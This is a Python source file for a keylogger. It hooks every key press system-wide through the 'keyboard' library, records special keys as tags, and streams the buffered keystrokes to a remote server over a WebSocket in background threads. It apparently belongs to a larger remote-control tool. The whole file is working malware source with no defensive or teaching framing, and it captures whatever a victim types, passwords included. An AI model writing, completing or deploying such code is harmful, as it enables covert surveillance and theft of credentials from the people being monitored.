import time
import threading
import keyboard
import json

class KeyLogger:
    def __init__(self):
        self.running = False
        self.keystrokes = []
        self.keylog_thread = None
        self.send_thread = None
        self.SPECIAL_KEYS = {
            'space': '<space>',
            'tab': '<tab>',
            'enter': '<enter>',
            'alt': '<alt>',
            'alt gr': '<altgr>',
            'shift': '<shift>',
            'ctrl': '<ctrl>',
            'backspace': '<backspace>',
            'caps lock': '<capslock>',
            'delete': '<delete>',
            'esc': '<esc>',
            'up': '<up>',
            'down': '<down>',
            'left': '<left>',
            'right': '<right>',
        }

    def log_keystrokes(self):
        def on_key_event(event):
            if self.running and event.event_type == keyboard.KEY_DOWN:
                key_name = event.name
                key_data = self.SPECIAL_KEYS.get(key_name.lower(), key_name)
                self.keystrokes.append(key_data)
                print(f"[Keystroke] Logged: {key_data}")

        keyboard.hook(on_key_event)

    def send_keystrokes(self, ws_holder):
        while self.running:
            time.sleep(0.1)
            if self.keystrokes and ws_holder.ws and ws_holder.ws.sock and ws_holder.ws.sock.connected:
                try:
                    payload = {
                        "type": "keylogger_keys",
                        "data": "".join(self.keystrokes.copy())
                    }
                    ws_holder.ws.send(json.dumps(payload))
                    self.keystrokes.clear()
                    print("[Keystrokes] Sent keystrokes to server")
                except Exception as e:
                    print(f"[Keystrokes Error] Failed to send keystrokes: {e}")
            elif not ws_holder.ws:
                print("[Keystrokes] Waiting for WebSocket connection...")

    def start_keylogger(self, ws_holder):
        if not self.running:
            self.running = True
            self.keylog_thread = threading.Thread(target=self.log_keystrokes, daemon=True)
            self.send_thread = threading.Thread(target=self.send_keystrokes, args=(ws_holder,), daemon=True)
            self.keylog_thread.start()
            self.send_thread.start()
            print("[Keylogger] Started")

    def stop_keylogger(self):
        if self.running:
            self.running = False
            keyboard.unhook_all()
            self.keystrokes.clear()
            self.keylog_thread = None
            self.send_thread = None
            print("[Keylogger] Stopped")

key_logger = KeyLogger()

def start_keylogger(ws_holder):
    key_logger.start_keylogger(ws_holder)

def stop_keylogger():
    key_logger.stop_keylogger()